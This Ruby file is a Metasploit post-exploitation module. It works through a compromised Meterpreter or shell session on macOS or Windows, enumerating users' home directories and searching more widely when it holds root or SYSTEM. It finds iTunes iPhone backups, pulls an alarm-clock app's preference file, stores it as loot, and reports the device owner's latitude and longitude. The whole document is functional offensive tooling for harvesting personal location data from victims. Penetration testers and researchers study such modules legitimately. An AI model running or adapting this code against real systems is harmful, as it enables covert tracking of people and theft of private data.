require 'msf/core'
require 'msf/core/post/file'
require 'rex'
require 'rexml/document'
require 'rex/parser/apple_backup_manifestdb'
require 'plist'
require 'cfpropertylist'

class Metasploit3 < Msf::Post

	include Msf::Post::File
	include Msf::Auxiliary::Badger_Report


	def initialize(info={})
		super( update_info(info,
			'Name'           => 'Mobile Backup Scrape (Badger)',
			'Description'    => %q{
			This module can be used to scrape a mobile device backup
			for geolocation artifacts.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[   'v10l3nt',
					'hdm', # Based on hdm's apple_ios_backup module structure
					'bannedit' # Based on bannedit's pidgin_cred module structure
				],
			'Version'        => '$Revision$',
			'Platform'       => ['windows', 'osx'],
			'SessionTypes'   => ['meterpreter', 'shell']
		))
	end

	#
	# Even though iTunes is only Windows and Mac OS X, look for the MobileSync files on all platforms
	#
	#
	def run
		case session.platform
		when /osx/
			@platform = :osx
			paths = enum_users_unix
		when /win/
			@platform = :windows
			drive = session.fs.file.expand_path("%SystemDrive%")
			os = session.sys.config.sysinfo['OS']

			if os =~ /Windows 7|Vista|2008/
				@appdata = '\\AppData\\Roaming'
				@users = drive + '\\Users'
			else
				@appdata = '\\Application Data'
				@users = drive + '\\Documents and Settings'
			end

			if session.type != "meterpreter"
				print_error "Only meterpreter sessions are supported on windows hosts"
				return
			end
			paths = enum_users_windows
		else
			print_error "Unsupported platform #{session.platform}"
			return
		end

		if paths.empty?
			print_status("No users found with an iTunes backup directory")
			return
		end

		process_backups(paths)
	end

	def enum_users_unix
		if @platform == :osx
			home = "/Users/"
		else
			home = "/home/"
		end

		if got_root?
			userdirs = []
			session.shell_command("ls #{home}").gsub(/\s/, "\n").split("\n").each do |user_name|
				userdirs << home + user_name
			end
			userdirs << "/root"
		else
			userdirs = [ home + whoami ]
		end

		backup_paths = []
		userdirs.each do |user_dir|
			output = session.shell_command("ls #{user_dir}/Library/Application\\ Support/MobileSync/Backup/")
			if output =~ /No such file/i
				next
			else
				#print_status("Found backup directory in: #{user_dir}")
				backup_paths << "#{user_dir}/Library/Application\\ Support/MobileSync/Backup/"
			end
		end

		check_for_backups_unix(backup_paths)
	end

	def check_for_backups_unix(backup_dirs)
		dirs = []
		backup_dirs.each do |backup_dir|
			print_status("Checking for backups in #{backup_dir}")
			session.shell_command("ls #{backup_dir}").each_line do |dir|
				next if dir == "." || dir == ".."
				if dir =~ /^[0-9a-f]{16}/i
					print_status("Found #{backup_dir}\\#{dir}")
					dirs << ::File.join(backup_dir.chomp, dir.chomp)
				end
			end
		end
		dirs
	end

	def enum_users_windows
		paths = Array.new

		if got_root?
			begin
				session.fs.dir.foreach(@users) do |path|
					next if path =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/i
					bdir = "#{@users}\\#{path}#{@appdata}\\Apple Computer\\MobileSync\\Backup"
					dirs = check_for_backups_win(bdir)
					dirs.each { |dir| paths << dir } if dirs
				end
			rescue ::Rex::Post::Meterpreter::RequestError
				# Handle the case of the @users base directory is not accessible
			end
		else
			print_status "Only checking #{whoami} account since we do not have SYSTEM..."
			path = "#{@users}\\#{whoami}#{@appdata}\\Apple Computer\\MobileSync\\Backup"
			dirs = check_for_backups_win(path)
			dirs.each { |dir| paths << dir } if dirs
		end
		return paths
	end

	def check_for_backups_win(bdir)
		dirs = []
		begin
            #print_status("Checking for backups in #{bdir}")
				session.fs.dir.foreach(bdir) do |dir|
				if dir =~ /^[0-9a-f]{16}/i
					print_status("Found #{bdir}\\#{dir}.chomp)")
					dirs << "#{bdir}\\#{dir}"
				end
			end
		rescue Rex::Post::Meterpreter::RequestError
			# Handle base directories that do not exist
		end
		dirs
	end

	def process_backups(paths)
		paths.each {|path| process_backup(path) }
	end

	def pillage_alarmclock(fname,path)
		fdata = ""
		if session.type == "shell"
			fdata = session.shell_command("cat #{path}/#{fname}")
		else
			mfd = session.fs.file.new("#{path}\\#{fname}", "rb")
			until mfd.eof?
				fdata << mfd.read
			end
			mfd.close
		end

		ctype = "application/octet-stream"
		file_loc = store_loot("ios.backup.alarmclockmagicfree.plist", ctype, session, fdata, "alarmclockmagicfree.plist", "Alarm Clock Free Plist")
		plist = CFPropertyList::List.new(:file => file_loc)
		data = CFPropertyList.native_types(plist.value)
		lon=data['geomint_lon']
		lat=data['geomint_lat']
		acc="1.0"
		pos = Position.new(lat,lon,acc)
		comment = "Alarm Clock iPhone Backup @ Host: #{session.session_host}"
		enc_comment = Rex::Text.encode_base64(comment)
		report_cresults(pos,"msf_mobilescrape",enc_comment)
		print_status("Location Found in Alarm Clock Free: #{lat},#{lon}")
	end

	def process_backup(path)
		## test to see if it exists first
		## AppDomain-com.mynewapps.alarmclockmagicfree-Library/Preferences/com.mynewapps.alarmclockmagicfree.plist
		fname="821ff4f481250e89126ad453fc15b1a28eb536ce"
		pillage_alarmclock(fname,path)
	end

	def got_root?
		case @platform
		when :windows
			if session.sys.config.getuid =~ /SYSTEM/
				return true
			else
				return false
			end
		else # unix, bsd, linux, osx
			ret = whoami
			if ret =~ /root/
				return true
			else
				return false
			end
		end
	end

	def whoami
		if @platform == :windows
			session.fs.file.expand_path("%USERNAME%")
		else
			session.shell_command("whoami").chomp
		end
	end
end
